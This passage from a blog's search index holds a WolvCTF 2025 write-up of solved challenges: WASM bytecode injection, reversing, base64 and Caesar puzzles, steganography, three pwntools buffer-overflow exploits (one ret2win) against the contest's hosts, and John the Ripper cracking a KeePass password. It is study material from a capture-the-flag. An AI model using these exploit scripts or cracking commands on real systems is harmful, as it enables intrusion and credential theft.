(answer) =&gt; {    mod.addSection(10, parseHex(answer));    let wasmMod = new WebAssembly.Module(new Uint8Array(mod.data));    let instance = new WebAssembly.Instance(wasmMod, { 'i': { win } });    instance.exports.main();    process.exit(0);});let isEven = require('is-even');function leb128(n) {    let result = [];    do {        result.push((n &amp; 0x7f) | 0x80);        n &gt;&gt;= 7;    } while (n)    result[result.length - 1] &amp;= 0x7f;    return result;}class Builder {    constructor() {        this.data = [0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00];    }    addSection(id, section) {        this.data.push(id);        this.data.push(...leb128(section.length));        this.data.push(...section);    }}// node doesn't support Uint8Array.fromHex :(function parseHex(answer) {    // javascript developers try not to write literally anything    // into a package challenge IMPOSSIBLE    if (!isEven(answer.length)) {        console.log(\"odd\");        process.exit(1);    }    let result = [];    for (let i = 0; i &lt; answer.length; i += 2) {        result.push(parseInt(answer.substring(i, i+2), 16));    }    return result;}module.exports = { Builder, parseHex }{  \"name\": \"wasmjail\",  \"version\": \"1.0.0\",  \"scripts\": {    \"test\": \"echo \\\"Error: no test specified\\\" &amp;&amp; exit 1\"  },  \"author\": \"\",  \"license\": \"ISC\",  \"description\": \"\",  \"dependencies\": {    \"is-even\": \"^1.0.0\"  }}Explanation of source code:0.js is a NodeJS code designed to create and execute WebAssembly (WASM) module dynamically, but seeing the way it processes the user input, it is vulnerable to WASM-based code injection aka arbitrary WebAssembly bytecode injection.Wasm.js is a NodeJs code provides helper functions for constructing WebAssembly (WASM) binaries dynamically. Since parseHex(answer) directly converts user input into executable WASM bytecode, an attacker can inject malicious WASM instructions, trigger arbitrary WebAssembly functions.So I am going to provide hex input that will be added as section 10 (the code section) of the module. So the hex string payload I will be providing to exploit the vulnerability is:01040010000bWhere,  0x01 for 1 function  0x04 for size (4 bytes)  0x00 for 0 locals  0x10 0x00 to call function index 0 (the imported win function)  0x0b to end the functionWhen we enter the string as input to tne netcat command, we will get the flag.We got the flag!BeginnerREverseHints:  You might want to use a decompiler  https://dogbolt.org/Explanation:They have given us a compressed folder - dist.tar.gz, read the writeup of Eval is Evil to know the decompression process.After decompressing, we will get a ELF 64-bit file - reverse and a text file - out.txt. From the hints we can understand that it is asking us to use a decompiler to analyse the binary. I am using Ghidra for binary analysis (you can use online decompiler - dogbolt as mentioned in the second hint).After analyzing the decompiled code of the binary, I got to know that it is a code to mix the contents of flag.txt, and the out.txt contains the output. So we have to reverse the output to get the input.I have written a python code to reverse the process.def unmix_flag(mixed_flag):    original_flag = ''.join(chr(ord(c) + 3) for c in mixed_flag)        return original_flagmixed_flag = input(\"Enter the mixed flag: \")original_flag = unmix_flag(mixed_flag)print(\"Original flag:\", original_flag)When we the give the contents of out.txt as the input of this pythond code, we will get the flag.(I don’t think this is the process, it must be a bug in the content of out.txt, according to the given binary file, it is also supposed to reverse it after subtracting 3, but when I try it that way I got the reverse flag. So I eliminated the revering process and only subtracted 3 in the python code.)We got the flag!Flag:  wctf{r3v3r51ng_1n_r3v3r53}REdata - RevHints:  did you know that there is information other than code in a binary?  Are there any utilities that let you find strings in files?Explanation:They have given us a compressed folder - dist.tar.gz, read the writeup of Eval is Evil to know the decompression process.After decompressing, we will get an ELF 64-bit file - redata. As the hint mentioned something about strings I used strings and grep command to get the flag.strings redata | grep \"wctf\"We got the flag!Flag: wctf{n0_w4y_y0u_f0unD_1t!}OverAndOver - CryptoHints:  Perhaps decoding once isnt enough?Explanation:After downloading and viewing the contents of the text file - encoded.txt, it looked like it was encrypted. So I tried base64 decoding.base64 -d encoded.txtIt somehow didn’t work YET!, as it is not geneating any invalid characters while decoding, it must be base64 encoded and from the challenge name and the hint, we can understand that it is being encoded multiple times.So as I didn’t know how many times I keep on running the below command to get the flagecho \"Vm0wd2QyUXlVWGxWV0d4V1YwZDRWMVl3WkRSWFJteFZVMjA1VjAxV2JETlhhMk0xVmpKS1IySkVUbGhoTVhCUVZteFZlRll5VGtsalJtaG9UVmhDVVZacVFtRlRNazE1VTJ0V1ZXSkhhRzlVVjNOM1pVWmFkR05GZEZSTlZXdzFWVEowVjFaWFNraGhSemxWVmpOT00xcFZXbUZrUjA1R1UyMTRVMkpIZHpGV1ZFb3dWakZhV0ZOcmFHaFNlbXhXVm0weGIxSkdXbGRYYlVaclVqRmFTRll5TVRSVk1rcElaSHBHVjJFeVVYZFpla3BIWXpGT2RWVnRhRk5sYlhoWFZtMHdlR0l4U2tkWGJHUllZbGhTV0ZSV2FFTlNiRnBZWlVoa1YwMUVSa1pWYkZKRFZqSkdjbUV6YUZaaGExcG9WakJhVDJOdFJrZFhiV2hzWWxob2IxWnRNWGRVTVZWNVVtdGtWMWRIYUZsWmJHaFRWMFpTVjFwRVFrOWlSM2hYVmpKNFQxWlhTa2RqUm14aFUwaENSRlpxUVhoa1ZsWjFWMnhrYUdFelFrbFdWM0JIVkRKU1YxVnVVbXBTYXpWWVZXcE9iMkl4V1hoYVJGSnBUVlpXTkZaWGRHdFhSMHB5VGxac1dtSkdXbWhaTW5oWFl6RldjbHBHYUdsU00xRjZWakowVTFVeFduSk5XRXBxVWxkNGFGVXdhRU5UUmxweFUydGFiRlpzV2xwWGExcDNZa2RGZWxGcmJGZGlXRUpJVmtSS1UxWXhXblZVYkdocFZqSm9lbGRYZUc5aU1rbDRWMjVTVGxkSFVsWlVWbHBYVGxaV2RHUkhkRmROVjFKSldWVmFjMWR0U2tkWGJXaGFUVlp3VkZacVJtdGtSa3AwWlVaa2FWSnNhM2hXYTFwaFZURlZlRmR1U2s1WFJYQnhWVzB4YjFZeFVsaE9WazVzWWtad2VGVXlkREJXTVZweVYyeHdXbFpXY0doWmEyUkdaVWRPU1dKR1pGZFNWWEJ2Vm10U1MxUXlVa2RUYmtwaFVtMW9jRlpxVG05V1ZtUlhWV3M1VWsxWFVraFdNalZUVkd4YVJsTnNhRlZXTTJoSVZHeGFZVmRGTlZaUFZtaFRUVWhDU2xac1pEUmpNV1IwVTJ0a1dHSlhhR0ZVVmxwM1lVWndSbHBHVGxSU2EzQjVWR3hhVDJGV1NuUlBWRTVYVFc1b1dGZFdXbEpsVmtweVdrWm9hV0Y2Vm5oV1ZFSnJUa1prUjFWc1pGaGhNMUpWVlcxNGQyVkdWblJOVldSV1RXdHdWMWxyVW1GWFIwVjRZMGhLV2xaWFVrZGFWV1JQVTBVNVYyRkhhRTVXYmtKMlZtMTBVMU14VVhsVVdHeFZZVEZ3YUZWcVNtOVdSbEpZVFZjNWJHSkhVbGxhVldNMVlWVXhXRlZ1Y0ZkTlYyaDJWakJrUzFkV1ZuSlBWbHBvWVRGd1NWWkhlR0ZaVm1SR1RsWmFVRll5YUhCVmJHaENaREZhYzFwRVVtcE5WMUl3VlRKMGExZEhTbGhoUjBaVlZteHdNMXBYZUhKbFZURldXa1pPYVZKcmNEWldhMk40WXpGVmVWTnVTbFJpVlZwWVZGYzFiMWRHWkZkWGJFcHNVbTFTZWxsVldsTmhWa3AxVVc1b1YxWXphSEpXVkVaelZqRldjMWRzYUdsV1ZuQjZWMWQwWVdReVZrZFdXR3hyVWtWS1dGUldXbmRsVmxsNVpVaGtXR0pHY0ZoWk1HaExWakpHY2xkcmVGZGhhM0JRVldwR1lXTXlSa2RoUmxKVFZsaENTMVpxUm1GVk1VMTRWbGhvV0ZkSGFHaFZNRnBoVm14c2NsZHJkR3BTYkhCNFZUSXdOV0pIU2toVmJHeGhWbGROTVZsV1ZYaFhSbFp5WVVaa1RtRnNXbFZXYTJRMFV6RktjMXBJVmxSaVJscFlXV3RvUTA1c1draGxSMFphVm0xU1IxUnNXbUZWUmxwMFZXczVWMkZyV2t4Vk1uaHJWakZhZEZKdGNFNVdNVWwzVmxSS01HRXhaRWhUYkdob1VqQmFWbFp0ZUhkTk1XeFdWMjVrVTJKSVFraFdSM2hUVmpKS2NsTnJhRmRTTTJob1ZrUktSMWRHU2xsYVIzQlRWak5vV1ZkWGVHOVJNVTE0Vld4a1lWSldjSE5WYlRGVFYyeGtjbFpVUmxoU2EzQmFWVmMxYjFZeFdYcGhTRXBhWVd0YWVsWnFSbGRqTVdSellVZG9UazFWY0RKV2JHTjRUa2RSZVZaclpGZGliRXBQVm14a1UySXhVbGRXYm1Sc1lrWnNOVnBWWkVkV01rcEhZa1JhV2xaWGFFeFdNbmhoVjBaV2NscEhSbGRXTVVwUlZsZHdSMWxYVFhsU2EyUm9VbXhLVkZac2FFTlRNVnAwVFZSQ1ZrMVZNVFJXVm1oelZsWmtTR0ZIYUZaTlJuQm9WbTE0YzJOc1pISmtSM0JUWWtad05GWlhNVEJOUmxsNFYyNU9hbEpYYUZoV2FrNVRWRVpzVlZGWWFGTldhM0I2VmtkNFlWVXlTa1pYV0hCWFZsWndSMVF4V2tOVmJFSlZUVVF3UFE9PQ==\" | base64 -dI used the above command because I can’t always decode and store it in another file to decode it again and open it everytime to know whether I got the flag, so I use the above command, use the output in the echo to decode it again. After running it multiple times (16 or 32, I don’t remember 😅). We will get the flag.We got the flag!Flag: wctf{bA5E_tWo_p0W_s!X}EtTuCaesar - CryptoHints:  A Caesar salad isn’t complete without a good toss—maybe try unscrambling it from different angles?  What if I put the note in the shape of a square?Explanation:This is the string in the given file - message.txt.tzc3Sq{k!ss!a!__FZ!!_!11}As it mentioned caesar cipher, I tried decoding it and at shift value 3, I got this:wcf3Vt{n!vv!d!__IC!!_!11} Though it looks like a flag, it isn’t from the hints we can know that to get the flag we have to arrange it in square. As the length is 25, let’s try to arrange it in 5x5 square.w c f 3 Vt { n ! vv ! d ! __ I C ! !_ ! 1 1 } After spending some time to find the pattern for the flag, I got the pattern it is1   2   4   7   113   5   8   12  166   9   13  17  1810  14  19  20  2115  22  23  24  25This pattern name is - diagonal filling pattern a.k.a diagonal traversal pattern. Arranging the decoded string in the order will give us the flag.We got the flag!Flag: wctf{v3n!_V!dI_v!C!_!1!1}PicturePerfect - ForensicsHint:  Images have interesting information in their metadata!Explanation:From the hint we can understand that the flag is in the metadata, so I used the exiftool to get the flag.exiftool hi_snowman.jpgWe will get the flag as the value of - Title, in the metadata.We got the flag!Flag: wctf{d0_yOU_w@nt_t0_BUiLd_a_Sn0Wm@n}DigginDir - ForensicsHint:  I wish there was a linux utility that let me search for stuff…Explanation:They have given us a compressed folder - dist.tar.gz, read the writeup of Eval is Evil to know the decompression process.After decompressing, we will get a folder - challenge which consists of 251 folders with each folder containg a text file. I expect that out of all folders one folder’s text file should have the flag. But we can’t keep checking every file manually so I used the below command:grep -r \"wctf\" .This command traverses all the contents and finds the string which contains - wctf, which is a part of the flag.We got the flag!Flag: wctf{0h_WOW_tH@Nk5_yOu_f0U^d_1t_xD}p0wn3d - PwnHint:  What is a buffer overflow? What is acii?Explanation:They have given us a netcat command and a compressed folder - dist.tar.gz, read the writeup of Eval is Evil to know the decompression process.After decompressing, we will get a ELF 64-bit file - chal and a C-programmed file - main.c. After analysing the C-programmed source code I understood that it is vulnerable to buffer overflow, so I created a python script to exploit the remote server, here is the python code:from pwn import *p = remote(\"p0wn3d.kctf-453514-codelab.kctf.cloud\", 1337)payload = b\"A\" * 32  payload += p32(0x42424242)  p.sendlineafter(\"Hello little p0wn3r. Do you have any first words?\", payload)p.interactive()Using this python script will give us the flag.We got the flag!Flag: wctf{pwn_1s_l0v3_pwn_1s_l1f3}p0wn3d_2 - PwnHint:  Stack layout? I wish I had GDB with me…Explanation:They have given us a netcat command and a compressed folder - dist.tar.gz, read the writeup of Eval is Evil to know the decompression process.After decompressing, we will get a ELF 64-bit file - chal and a C-programmed file - main.c. After analysing the C-programmed source code I understood that it is vulnerable to buffer overflow has stack layout issue. So to exploit it, I have written a python script which exploits the buffer overflow vulnerability in the remote server.from pwn import *p = remote(\"p0wn3d2.kctf-453514-codelab.kctf.cloud\", 1337)payload = b\"A\" * 32         payload += p32(0xdeadbeef)  payload += p32(0x0badc0de)  p.sendlineafter(\"I can't believe you just did that. Do you have anything to say for yourself?\", payload)p.interactive()This python source code will give us the flag.We got the flag.Flag: wctf{4ll_y0uR_mEm_4r3_bel0ng_2_Us}p0wn3d_3 - PwnHint:  look up what ret2win isExplanation:They have given us a netcat command and a compressed folder - dist.tar.gz, read the writeup of Eval is Evil to know the decompression process.From the hint, ret2win is a return-oriented attack where the goal is to hijack execution flow and directly call a function (get_flag()). Instead of injecting shellcode, the exploit simply redirects execution to an existing function in the binary. This is possible because the binary already contains a useful function (get_flag()) that prints the flag.After decompressing, we will get a ELF 64-bit file - chal and a C-programmed file - main.c. After analysing the C-programmed source code I understood that it is vulnerable to buffer overflow has no stack canaries, no Address Space Layout Randomization (ASLR) or PIE.To exploit this, I crafted a python code which exploits a buffer overflow vulnerability in the binary chal or the remote server and use the ret2win technique to call the get_flag() functionfrom pwn import *REMOTE = True  BINARY = \"./chal\"elf = ELF(BINARY)context.binary = elfif REMOTE:    p = remote(\"p0wn3d3.kctf-453514-codelab.kctf.cloud\", 1337)else:    p = process(BINARY)get_flag = elf.symbols[\"get_flag\"]log.success(f\"get_flag address: {hex(get_flag)}\")offset = 40  payload = b\"A\" * offset  payload += p64(get_flag)  p.sendlineafter(\"something like this before\\n\", payload)p.interactive()  This python source code will give us the flag.We got the flag.Flag: wctf{gr4dua73d_fr0m_l1ttl3_p0wn3r!}ForensicsPasswordsExplanation:We were given a file - Database.kdbx which is a Keepass password database.(KeePass is a free, open-source password manager that helps you securely store and manage your passwords in an encrypted database. The database file usually has a .kdbx extension and is protected by a master password, key file, or both.)Let’s try to open it using keepassxc.keepassxc Database.kdbxBut it is asking for password, so let’s crack the password using John The Ripper.john --wordlist=/usr/share/wordlists/rockyou.txt hash.txtThis gave us a password - goblue1. Now opening the keepass password database using the password, we can see the interface and on the left, sections like - Windows, Network etc., each section has a entry, by double-clicking on it and using the show icon on the password we can view the password. Now let’s try searching for the flag. We can find the flag in Homebanking.We got the flag!Flag: wctf{1_th0ught_1t_w4s_s3cur3?}BreakoutExplantion:We are given a jpg file - breakout.jpg. So after researching on what breakout it and viewing the image, it turns out Breakout is a game developed by Atari in 1976. So this challenge has something to do with the game.Now I used various tools on the image found nothing helpful, luckily on using steghide f=I found somethingsteghide extract -sf breakout.jpgI was able to extract a file - breakout.ch8 which is embeded into the image using steganography..ch8 is a ROM file for the CHIP-8 virtual machine/interpreter. CHIP-8 is an old programming language used in the 1970s primarily for gaming on microcomputers and is now commonly used in emulation.So I think we should play the game to get the flag, I tried searching for online chip-8 emulators to play the game and found - https://ffhan.github.io/ . The webpage allows us to load the chip-8 file and play the game. So I played the classic game and completed it, this gave me the flag.We got the flag!Flag: WCTF{GAME_OVER_VMASBKLTNUFMGS}So, YEP! These are the challenges I solved in WolvCTF 2025. There were a few other challenges that I got stuck on and couldn’t quite solve, but I came close. My favorite challenge from this CTF was definitel Breakout - it involved exploring an old programming language and revisiting the nostalgic Atari game Breakout!Overall, WolvCTF 2025 was an amazing experience! I learned a lot about forensics and reverse engineering, and I even came to love pwn. While I managed to solve most challenges, I struggled with some OSINT and reverse engineering challenges. I’ll be focusing on improving my skills for the next CTF!Big shoutout to my team, WolvSec, for the teamwork and support! Huge thanks to the organizers of WolvCTF 2025 for putting together such an exciting competition.If you found this writeup helpful or have any thoughts, feel free to reach out—let’s connect! Looking forward to the next CTF! 🚀"
  },
  
  {
    "title": "Welcome to My Blog 👋",
    "url": "/posts/welcome/",
    "categories": "Others",
    "tags": "welcome",
    "date": "2025-03-14 00:00:00 +0530",
    





    
    "snippet": "Hello and welcome to my blog! 🚀I’m passionate about cybersecurity, working on various projects, and participating in Capture The Flag (CTF) competitions. This blog is my space to share:🏆 CTF Writeu...",
    "content": "Hello and welcome to my blog! 🚀I’m passionate about cybersecurity, working on various projects, and participating in Capture The Flag (CTF) competitions. This blog is my space to share:🏆 CTF Writeups – Breaking down challenges, strategies, and solutions.🔐 Cybersecurity Insights – Topics, tools, and techniques that I find useful.🛠️ Projects – Showcasing my work in cybersecurity and related fields.🏅 Achievements – Highlights of my journey in this exciting domainWhy This Blog?The cybersecurity world is vast, and learning never stops. By documenting my experiences, I hope to:✅ Help others understand and solve challenges.✅ Contribute to the cybersecurity community.✅ Track my own progress and growth.Stay tuned for upcoming posts, and feel free to connect or leave feedback! 🔥Cheers,CYB3R-BO1"
  }
  
]

